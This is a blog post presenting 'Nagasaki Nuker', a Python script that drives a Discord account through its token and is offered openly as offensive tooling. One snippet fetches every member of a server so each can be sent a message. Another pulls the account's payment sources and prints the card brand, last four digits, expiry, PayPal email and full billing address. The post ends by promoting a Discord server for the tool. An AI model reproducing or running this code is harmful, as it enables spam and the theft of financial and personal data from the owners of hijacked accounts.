---
layout: post
title: Nagasaki Nuker
subtitle: Python Script to Execute Processes via Discord Token
tags: [python]
---
> Fetch members from Guild ID and send a message to each user

```python
def find_members(desired_guild, first_channel):
    def close_after_fetching(resp, guild_id):
        if bing.gateway.finishedMemberFetching(guild_id):
            lenmembersfetched = len(bing.gateway.session.guild(guild_id).members)
            print()
            print(str(lenmembersfetched) + ' members fetched')
            print()
            bing.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
            bing.gateway.close()

    def get_members(guild_id, channel_id):
        bing.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
        bing.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
        bing.gateway.run()
        bing.gateway.resetSession()
        return bing.gateway.session.guild(guild_id).members
Credit: Exordium
```
> Get User's payments
 
```python
def payment_source():
    source = bing.getPaymentSources().json()
    if len(source) > 0:
        for i in range(len(source)):
            if 'email' in source[i]:
                print(Fore.WHITE + "Payment Method: PayPal")
                print(Fore.GREEN + f"E-Mail: {source[i]['email']}" + Fore.BLUE + " (PayPal)")
            else:
                print(Fore.WHITE + "Payment Method: Card")
                print(Fore.GREEN + f"Credit Card: {source[i]['brand']}" + Fore.BLUE + " (Credit Card)")
                print(Fore.GREEN + f"Last 4 Numbers: {source[i]['last_4']}")
                print(Fore.GREEN + f"Expires: {source[i]['expires_month']}/{source[i]['expires_year']}")
            print(Fore.GREEN + f"Name: {source[i]['billing_address']['name']}")
            print(Fore.GREEN + f"Address 1: {source[i]['billing_address']['line_1']}")
            print(Fore.GREEN + f"Address 2: {source[i]['billing_address']['line_2']}")
            print(Fore.GREEN + f"City: {source[i]['billing_address']['city']}")
            print(Fore.GREEN + f"State: {source[i]['billing_address']['state']}")
            print(Fore.GREEN + f"Country: {source[i]['billing_address']['country']}")
```

{: .box-error}
**Error:** Script still in development. Join [BingBot Official Discord](https://discord.gg/d6TB9xUBgj) for more information
